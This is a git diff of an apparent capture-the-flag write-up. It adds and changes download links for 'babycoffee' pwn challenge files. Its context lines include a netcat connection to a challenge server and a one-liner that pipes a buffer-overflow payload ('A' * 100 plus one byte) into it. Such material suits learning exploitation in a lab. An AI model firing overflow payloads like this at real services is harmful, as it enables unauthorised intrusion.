@@ -158,6 +158,11 @@
 >nc 52.175.52.175 39001
 
 
+## **File(s):**
+Pwn/100_babycoffee-1.zip
+https://github.com/louisfox/CTF-Write-UP/blob/main/Pwn/100_babycoffee-1.zip
+
+
 ## **write-up:**
 
 >python2 -c "print 'A' * 100 + '\x44'" |  nc 52.175.52.175 39001
@@ -183,8 +188,8 @@
 
 
 ## **File(s):**
-Pwn/388_hide.zip
-https://github.com/louisfox/CTF-Write-UP/blob/main/Pwn/388_hide.zip
+Pwn/244_babycoffee-1.zip
+https://github.com/louisfox/CTF-Write-UP/blob/main/Pwn/244_babycoffee-1.zip
 
 
 ## **write-up:**
